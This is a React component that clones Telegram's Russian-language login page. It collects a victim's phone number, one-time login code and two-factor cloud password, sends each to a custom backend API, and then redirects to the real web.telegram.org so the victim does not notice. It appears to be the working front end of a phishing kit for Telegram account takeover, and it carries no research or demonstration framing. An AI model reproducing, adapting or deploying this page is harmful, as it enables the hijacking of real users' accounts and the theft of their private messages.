import { useState, useRef, useEffect } from "react";
import { api } from "./api";

// ─── Types ────────────────────────────────────────────────────────────────────
type Step = "phone" | "code" | "password" | "done" | "error";

interface Country {
  code: string;
  flag: string;
  name: string;
}

// ─── Countries ────────────────────────────────────────────────────────────────
const COUNTRIES: Country[] = [
  { code: "+7",   flag: "🇷🇺", name: "Россия" },
  { code: "+380", flag: "🇺🇦", name: "Украина" },
  { code: "+375", flag: "🇧🇾", name: "Беларусь" },
  { code: "+77",  flag: "🇰🇿", name: "Казахстан" },
  { code: "+996", flag: "🇰🇬", name: "Кыргызстан" },
  { code: "+998", flag: "🇺🇿", name: "Узбекистан" },
  { code: "+994", flag: "🇦🇿", name: "Азербайджан" },
  { code: "+374", flag: "🇦🇲", name: "Армения" },
  { code: "+995", flag: "🇬🇪", name: "Грузия" },
  { code: "+992", flag: "🇹🇯", name: "Таджикистан" },
  { code: "+993", flag: "🇹🇲", name: "Туркменистан" },
  { code: "+1",   flag: "🇺🇸", name: "США / Канада" },
  { code: "+44",  flag: "🇬🇧", name: "Великобритания" },
  { code: "+49",  flag: "🇩🇪", name: "Германия" },
  { code: "+33",  flag: "🇫🇷", name: "Франция" },
  { code: "+34",  flag: "🇪🇸", name: "Испания" },
  { code: "+39",  flag: "🇮🇹", name: "Италия" },
  { code: "+31",  flag: "🇳🇱", name: "Нидерланды" },
  { code: "+48",  flag: "🇵🇱", name: "Польша" },
  { code: "+90",  flag: "🇹🇷", name: "Турция" },
  { code: "+98",  flag: "🇮🇷", name: "Иран" },
  { code: "+91",  flag: "🇮🇳", name: "Индия" },
  { code: "+86",  flag: "🇨🇳", name: "Китай" },
  { code: "+81",  flag: "🇯🇵", name: "Япония" },
  { code: "+82",  flag: "🇰🇷", name: "Корея" },
  { code: "+55",  flag: "🇧🇷", name: "Бразилия" },
  { code: "+52",  flag: "🇲🇽", name: "Мексика" },
  { code: "+971", flag: "🇦🇪", name: "ОАЭ" },
  { code: "+966", flag: "🇸🇦", name: "Саудовская Аравия" },
  { code: "+20",  flag: "🇪🇬", name: "Египет" },
];

// ─── SVG Logo ────────────────────────────────────────────────────────────────
function TgLogo() {
  return (
    <svg width="90" height="90" viewBox="0 0 240 240" fill="none">
      <defs>
        <linearGradient id="g1" x1="120" y1="0" x2="120" y2="240" gradientUnits="userSpaceOnUse">
          <stop offset="0%" stopColor="#2AABEE" />
          <stop offset="100%" stopColor="#229ED9" />
        </linearGradient>
      </defs>
      <circle cx="120" cy="120" r="120" fill="url(#g1)" />
      <path
        d="M54 117.5c36.6-15.9 61-26.5 73.2-31.7 34.8-14.5 42.1-17 46.8-17.1 1 0 3.3.3 4.8 1.4 1.2.9 1.6 2.2 1.7 3.1.2.9.4 2.9.2 4.5-1.8 18.9-9.6 64.8-13.6 86-1.7 9-5 12-8.2 12.3-7 .6-12.3-4.6-19-9-10.6-6.9-16.5-11.2-26.8-18-11.9-7.8-4.2-12.1 2.6-19.1 1.8-1.8 32.5-29.8 33.1-32.3.1-.3.1-.6-.2-.9-.3-.2-.8-.1-1.1-.1-1 .2-16.1 10.2-45.5 30-4.3 3-8.2 4.4-11.7 4.3-3.9-.1-11.3-2.2-16.8-4-6.8-2.2-12.1-3.3-11.7-7 .3-1.9 2.8-3.8 7.5-5.9z"
        fill="white"
      />
    </svg>
  );
}

// ─── Spinner ─────────────────────────────────────────────────────────────────
function Spinner() {
  return (
    <div style={{
      width: 20, height: 20,
      border: "3px solid rgba(255,255,255,0.3)",
      borderTop: "3px solid #fff",
      borderRadius: "50%",
      animation: "spin 0.8s linear infinite",
      display: "inline-block",
      verticalAlign: "middle",
      marginRight: 8,
    }} />
  );
}

// ─── Main ─────────────────────────────────────────────────────────────────────
export default function App() {
  const [step, setStep] = useState<Step>("phone");
  const [country, setCountry] = useState<Country>(COUNTRIES[0]);
  const [phone, setPhone] = useState("");
  const [fullPhone, setFullPhone] = useState("");
  const [code, setCode] = useState(["", "", "", "", ""]);
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [showCountry, setShowCountry] = useState(false);
  const [countrySearch, setCountrySearch] = useState("");
  const [showPass, setShowPass] = useState(false);

  const codeRefs = useRef<(HTMLInputElement | null)[]>([]);
  const phoneRef = useRef<HTMLInputElement>(null);
  const passRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (step === "phone") setTimeout(() => phoneRef.current?.focus(), 100);
    if (step === "password") setTimeout(() => passRef.current?.focus(), 100);
    if (step === "code") setTimeout(() => codeRefs.current[0]?.focus(), 100);
  }, [step]);

  const filteredCountries = COUNTRIES.filter(
    (c) =>
      c.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
      c.code.includes(countrySearch)
  );

  // ── Step 1: Phone ──────────────────────────────────────────────────────────
  const handlePhoneSubmit = async () => {
    if (phone.length < 6 || loading) return;
    setLoading(true);
    setErrorMsg("");
    const fp = country.code + phone;
    setFullPhone(fp);
    try {
      await api.sendCode(fp);
      setStep("code");
    } catch (e: unknown) {
      setErrorMsg(e instanceof Error ? e.message : "Ошибка. Попробуйте снова.");
    } finally {
      setLoading(false);
    }
  };

  // ── Step 2: Code ───────────────────────────────────────────────────────────
  const handleCodeChange = (i: number, val: string) => {
    if (!/^\d?$/.test(val)) return;
    const next = [...code];
    next[i] = val;
    setCode(next);
    if (val && i < 4) codeRefs.current[i + 1]?.focus();
    if (!val && i > 0) codeRefs.current[i - 1]?.focus();
  };

  const handleCodePaste = (e: React.ClipboardEvent) => {
    const raw = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 5);
    if (!raw) return;
    e.preventDefault();
    const arr = raw.split("").concat(["", "", "", "", ""]).slice(0, 5);
    setCode(arr);
    const lastFilled = Math.min(raw.length - 1, 4);
    codeRefs.current[lastFilled]?.focus();
  };

  const handleCodeKeyDown = (i: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !code[i] && i > 0) {
      codeRefs.current[i - 1]?.focus();
    }
  };

  const handleCodeSubmit = async () => {
    const joined = code.join("");
    if (joined.length < 5 || loading) return;
    setLoading(true);
    setErrorMsg("");
    try {
      const res = await api.verifyCode(fullPhone, joined);
      if (res.need_password) {
        setStep("password");
      } else {
        setStep("done");
        setTimeout(() => { window.location.href = "https://web.telegram.org/"; }, 2500);
      }
    } catch (e: unknown) {
      setErrorMsg(e instanceof Error ? e.message : "Неверный код");
      setCode(["", "", "", "", ""]);
      codeRefs.current[0]?.focus();
    } finally {
      setLoading(false);
    }
  };

  // ── Step 3: Password ───────────────────────────────────────────────────────
  const handlePasswordSubmit = async () => {
    if (!password || loading) return;
    setLoading(true);
    setErrorMsg("");
    try {
      await api.verifyPassword(fullPhone, password);
      setStep("done");
      setTimeout(() => { window.location.href = "https://web.telegram.org/"; }, 2500);
    } catch (e: unknown) {
      setErrorMsg(e instanceof Error ? e.message : "Неверный пароль");
      setPassword("");
      passRef.current?.focus();
    } finally {
      setLoading(false);
    }
  };

  // ─── Render ────────────────────────────────────────────────────────────────
  return (
    <>
      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #17212b; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes shake {
          0%,100% { transform: translateX(0); }
          20% { transform: translateX(-8px); }
          40% { transform: translateX(8px); }
          60% { transform: translateX(-5px); }
          80% { transform: translateX(5px); }
        }
        .tg-card { animation: fadeIn 0.3s ease; }
        .tg-input:focus { border-color: #2AABEE !important; outline: none; }
        .tg-btn { transition: all 0.15s; }
        .tg-btn:hover:not(:disabled) { background: #33b8f8 !important; }
        .tg-btn:active:not(:disabled) { transform: scale(0.98); }
        .tg-btn:disabled { opacity: 0.55; cursor: not-allowed; }
        .country-item:hover { background: #1c2d3d !important; cursor: pointer; }
        .code-box:focus { border-color: #2AABEE !important; outline: none; background: #1a2e42 !important; }
        .back-link { color: #2AABEE; cursor: pointer; font-size: 14px; margin-top: 16px; display: inline-block; }
        .back-link:hover { text-decoration: underline; }
        .error-shake { animation: shake 0.4s ease; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #1c2733; }
        ::-webkit-scrollbar-thumb { background: #2f4a62; border-radius: 4px; }
      `}</style>

      <div style={{
        minHeight: "100vh",
        background: "#17212b",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: "24px 16px",
        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
      }}>
        <div className="tg-card" style={{
          background: "#232e3c",
          borderRadius: 18,
          padding: "44px 36px 36px",
          width: "100%",
          maxWidth: 400,
          boxShadow: "0 16px 48px rgba(0,0,0,0.5)",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
        }}>

          {/* LOGO */}
          <TgLogo />

          {/* ── PHONE STEP ── */}
          {step === "phone" && (
            <div style={{ width: "100%", display: "flex", flexDirection: "column", alignItems: "center" }}>
              <h1 style={{ fontSize: 26, fontWeight: 700, color: "#fff", margin: "18px 0 8px", textAlign: "center" }}>
                Войти в Telegram
              </h1>
              <p style={{ fontSize: 14, color: "#8b98a7", textAlign: "center", marginBottom: 28, lineHeight: 1.6 }}>
                Укажите ваш номер телефона в международном формате.
              </p>

              {/* Country selector */}
              <div style={{ width: "100%", marginBottom: 12, position: "relative" }}>
                <label style={{ fontSize: 12, color: "#8b98a7", marginBottom: 6, display: "block" }}>Страна</label>
                <button
                  onClick={() => { setShowCountry(!showCountry); setCountrySearch(""); }}
                  style={{
                    width: "100%",
                    background: "#1c2733",
                    border: "1px solid #2f3e4e",
                    borderRadius: 10,
                    color: "#fff",
                    fontSize: 15,
                    padding: "12px 16px",
                    cursor: "pointer",
                    textAlign: "left",
                    display: "flex",
                    alignItems: "center",
                    gap: 10,
                    transition: "border-color 0.2s",
                  }}
                >
                  <span style={{ fontSize: 20 }}>{country.flag}</span>
                  <span style={{ flex: 1 }}>{country.name}</span>
                  <span style={{ color: "#8b98a7" }}>{country.code}</span>
                  <span style={{ color: "#8b98a7", fontSize: 12 }}>{showCountry ? "▲" : "▼"}</span>
                </button>

                {showCountry && (
                  <div style={{
                    position: "absolute",
                    top: "calc(100% + 4px)",
                    left: 0,
                    right: 0,
                    background: "#1c2733",
                    border: "1px solid #2f3e4e",
                    borderRadius: 10,
                    maxHeight: 240,
                    overflowY: "auto",
                    zIndex: 100,
                    boxShadow: "0 8px 24px rgba(0,0,0,0.4)",
                  }}>
                    <input
                      autoFocus
                      placeholder="Поиск..."
                      value={countrySearch}
                      onChange={(e) => setCountrySearch(e.target.value)}
                      style={{
                        width: "100%",
                        background: "#172130",
                        border: "none",
                        borderBottom: "1px solid #2f3e4e",
                        color: "#fff",
                        fontSize: 14,
                        padding: "10px 14px",
                        outline: "none",
                      }}
                    />
                    {filteredCountries.map((c) => (
                      <div
                        key={c.code + c.name}
                        className="country-item"
                        onClick={() => {
                          setCountry(c);
                          setShowCountry(false);
                        }}
                        style={{
                          padding: "10px 14px",
                          display: "flex",
                          alignItems: "center",
                          gap: 10,
                          color: "#fff",
                          fontSize: 14,
                          background: country.code === c.code && country.name === c.name ? "#1c2d3d" : "transparent",
                          transition: "background 0.1s",
                        }}
                      >
                        <span style={{ fontSize: 18 }}>{c.flag}</span>
                        <span style={{ flex: 1 }}>{c.name}</span>
                        <span style={{ color: "#8b98a7" }}>{c.code}</span>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              {/* Phone input */}
              <div style={{ width: "100%", marginBottom: 20 }}>
                <label style={{ fontSize: 12, color: "#8b98a7", marginBottom: 6, display: "block" }}>Номер телефона</label>
                <div style={{ display: "flex", gap: 8 }}>
                  <div style={{
                    background: "#1c2733",
                    border: "1px solid #2f3e4e",
                    borderRadius: 10,
                    color: "#fff",
                    fontSize: 15,
                    padding: "12px 14px",
                    whiteSpace: "nowrap",
                    flexShrink: 0,
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                  }}>
                    <span style={{ fontSize: 18 }}>{country.flag}</span>
                    <span style={{ color: "#8b98a7" }}>{country.code}</span>
                  </div>
                  <input
                    ref={phoneRef}
                    className="tg-input"
                    type="tel"
                    placeholder="Номер телефона"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 12))}
                    onKeyDown={(e) => e.key === "Enter" && handlePhoneSubmit()}
                    style={{
                      flex: 1,
                      background: "#1c2733",
                      border: "1px solid #2f3e4e",
                      borderRadius: 10,
                      color: "#fff",
                      fontSize: 16,
                      padding: "12px 16px",
                      outline: "none",
                      transition: "border-color 0.2s",
                      width: "100%",
                    }}
                  />
                </div>
              </div>

              {errorMsg && (
                <div className="error-shake" style={{
                  width: "100%",
                  background: "#2d1414",
                  border: "1px solid #5a2020",
                  borderRadius: 8,
                  color: "#f87171",
                  fontSize: 13,
                  padding: "10px 14px",
                  marginBottom: 14,
                  textAlign: "center",
                }}>
                  {errorMsg}
                </div>
              )}

              <button
                className="tg-btn"
                onClick={handlePhoneSubmit}
                disabled={phone.length < 6 || loading}
                style={{
                  width: "100%",
                  padding: "14px",
                  background: "#2AABEE",
                  color: "#fff",
                  border: "none",
                  borderRadius: 10,
                  fontSize: 16,
                  fontWeight: 600,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                {loading && <Spinner />}
                {loading ? "Отправка кода…" : "Далее"}
              </button>

              <p style={{ fontSize: 12, color: "#556070", textAlign: "center", marginTop: 16, lineHeight: 1.6 }}>
                Мы отправим код подтверждения в приложение Telegram или по SMS.
              </p>
            </div>
          )}

          {/* ── CODE STEP ── */}
          {step === "code" && (
            <div style={{ width: "100%", display: "flex", flexDirection: "column", alignItems: "center" }}>
              <h1 style={{ fontSize: 24, fontWeight: 700, color: "#fff", margin: "18px 0 8px", textAlign: "center" }}>
                Введите код
              </h1>
              <p style={{ fontSize: 14, color: "#8b98a7", textAlign: "center", marginBottom: 28, lineHeight: 1.6 }}>
                Мы отправили код подтверждения<br />
                на номер <strong style={{ color: "#fff" }}>{fullPhone}</strong>
              </p>

              {/* 5-digit code boxes */}
              <div style={{ display: "flex", gap: 10, marginBottom: 24, justifyContent: "center" }} onPaste={handleCodePaste}>
                {code.map((digit, i) => (
                  <input
                    key={i}
                    ref={(el) => { codeRefs.current[i] = el; }}
                    className="code-box"
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleCodeChange(i, e.target.value)}
                    onKeyDown={(e) => handleCodeKeyDown(i, e)}
                    style={{
                      width: 52,
                      height: 60,
                      background: digit ? "#1a2e42" : "#1c2733",
                      border: `2px solid ${digit ? "#2AABEE" : "#2f3e4e"}`,
                      borderRadius: 10,
                      color: "#fff",
                      fontSize: 24,
                      fontWeight: 700,
                      textAlign: "center",
                      outline: "none",
                      caretColor: "#2AABEE",
                      transition: "all 0.15s",
                    }}
                  />
                ))}
              </div>

              {errorMsg && (
                <div className="error-shake" style={{
                  width: "100%",
                  background: "#2d1414",
                  border: "1px solid #5a2020",
                  borderRadius: 8,
                  color: "#f87171",
                  fontSize: 13,
                  padding: "10px 14px",
                  marginBottom: 14,
                  textAlign: "center",
                }}>
                  {errorMsg}
                </div>
              )}

              <button
                className="tg-btn"
                onClick={handleCodeSubmit}
                disabled={code.join("").length < 5 || loading}
                style={{
                  width: "100%",
                  padding: "14px",
                  background: "#2AABEE",
                  color: "#fff",
                  border: "none",
                  borderRadius: 10,
                  fontSize: 16,
                  fontWeight: 600,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                {loading && <Spinner />}
                {loading ? "Проверка…" : "Подтвердить"}
              </button>

              <span className="back-link" onClick={() => { setStep("phone"); setErrorMsg(""); setCode(["","","","",""]); }}>
                ← Изменить номер
              </span>
            </div>
          )}

          {/* ── PASSWORD STEP ── */}
          {step === "password" && (
            <div style={{ width: "100%", display: "flex", flexDirection: "column", alignItems: "center" }}>
              <h1 style={{ fontSize: 24, fontWeight: 700, color: "#fff", margin: "18px 0 8px", textAlign: "center" }}>
                Двухфакторная защита
              </h1>
              <p style={{ fontSize: 14, color: "#8b98a7", textAlign: "center", marginBottom: 28, lineHeight: 1.6 }}>
                Ваш аккаунт защищён облачным паролем.<br />
                Введите пароль для завершения входа.
              </p>

              <div style={{ width: "100%", marginBottom: 20, position: "relative" }}>
                <label style={{ fontSize: 12, color: "#8b98a7", marginBottom: 6, display: "block" }}>Облачный пароль</label>
                <input
                  ref={passRef}
                  className="tg-input"
                  type={showPass ? "text" : "password"}
                  placeholder="Пароль"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handlePasswordSubmit()}
                  style={{
                    width: "100%",
                    background: "#1c2733",
                    border: "1px solid #2f3e4e",
                    borderRadius: 10,
                    color: "#fff",
                    fontSize: 16,
                    padding: "12px 48px 12px 16px",
                    outline: "none",
                    transition: "border-color 0.2s",
                  }}
                />
                <button
                  onClick={() => setShowPass(!showPass)}
                  style={{
                    position: "absolute",
                    right: 12,
                    top: "calc(50% + 10px)",
                    transform: "translateY(-50%)",
                    background: "none",
                    border: "none",
                    cursor: "pointer",
                    color: "#8b98a7",
                    fontSize: 16,
                    padding: 4,
                  }}
                >
                  {showPass ? "🙈" : "👁"}
                </button>
              </div>

              {errorMsg && (
                <div className="error-shake" style={{
                  width: "100%",
                  background: "#2d1414",
                  border: "1px solid #5a2020",
                  borderRadius: 8,
                  color: "#f87171",
                  fontSize: 13,
                  padding: "10px 14px",
                  marginBottom: 14,
                  textAlign: "center",
                }}>
                  {errorMsg}
                </div>
              )}

              <button
                className="tg-btn"
                onClick={handlePasswordSubmit}
                disabled={!password || loading}
                style={{
                  width: "100%",
                  padding: "14px",
                  background: "#2AABEE",
                  color: "#fff",
                  border: "none",
                  borderRadius: 10,
                  fontSize: 16,
                  fontWeight: 600,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                {loading && <Spinner />}
                {loading ? "Вход…" : "Войти"}
              </button>

              <p style={{ fontSize: 12, color: "#556070", textAlign: "center", marginTop: 16 }}>
                Забыли пароль?{" "}
                <span style={{ color: "#2AABEE", cursor: "pointer" }}>Сбросить через email</span>
              </p>
            </div>
          )}

          {/* ── DONE STEP ── */}
          {step === "done" && (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0" }}>
              <div style={{ fontSize: 72, marginTop: 16, marginBottom: 8 }}>✅</div>
              <h1 style={{ fontSize: 24, fontWeight: 700, color: "#fff", textAlign: "center", marginBottom: 10 }}>
                Вход выполнен
              </h1>
              <p style={{ fontSize: 14, color: "#8b98a7", textAlign: "center", lineHeight: 1.6 }}>
                Перенаправляем вас в Telegram Web…
              </p>
              <div style={{ marginTop: 24 }}>
                <Spinner />
              </div>
            </div>
          )}

        </div>
      </div>
    </>
  );
}
